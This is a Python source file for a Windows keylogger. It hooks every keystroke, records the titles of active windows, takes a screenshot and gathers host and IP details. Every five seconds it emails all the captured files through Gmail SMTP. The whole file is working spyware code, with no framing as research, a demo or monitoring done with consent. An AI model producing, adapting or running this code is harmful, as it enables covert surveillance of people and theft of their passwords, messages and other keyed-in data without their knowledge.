import keyboard
import smtplib
import time
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
from PIL import ImageGrab
import psutil
import win32gui
from datetime import datetime

# Clear previous logs
for filename in ['document.txt', 'applicationLog.txt', 'syseminfo.txt', 'screenshot.png']:
    try:
        if os.path.exists(filename):
            os.remove(filename)
    except Exception as e:
        print(f"Failed to delete {filename}: {e}")

active_apps = {}

def get_active_app_name():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

def computer_information():
    with open("syseminfo.txt", "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")
        f.write('\nProcessor: ' + platform.processor())
        f.write('\nSystem: ' + platform.system() + " " + platform.version())
        f.write('\nMachine: ' + platform.machine())
        f.write('\nHostname: ' + hostname)
        f.write('\nPrivate IP Address: ' + IPAddr)

def capture_keys():
    keys = []
    start_time = time.time()

    def on_key_press(event):
        nonlocal keys
        keys.append(' ' if event.name == 'space' else event.name)
        active_app = get_active_app_name()
        if active_app:
            active_apps[event.time] = active_app

    def write_to_file():
        with open('document.txt', 'a') as file:
            file.write(''.join(keys))
            keys.clear()

    def write_application_log():
        with open('applicationLog.txt', 'a') as file:
            for timestamp, app_name in active_apps.items():
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
            active_apps.clear()

    def send_email():
        sender_email = os.environ.get('SENDER_EMAIL')
        receiver_email = sender_email
        password = os.environ.get('EMAIL_APP_PASSWORD')
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587

        if not sender_email or not password:
            print("Missing environment variables for email. Set SENDER_EMAIL and EMAIL_APP_PASSWORD.")
            return

        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = 'Captured Data'

        for file_name in ['document.txt', 'applicationLog.txt', 'syseminfo.txt', 'screenshot.png']:
            if os.path.exists(file_name):
                with open(file_name, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={file_name}')
                    message.attach(part)

        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message.as_string())
                print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Failed to send email:", str(e))

    keyboard.on_press(on_key_press)

    try:
        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time >= 5:
                write_to_file()
                write_application_log()
                send_email()
                start_time = time.time()
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all()

# Run the functions
computer_information()
capture_keys()
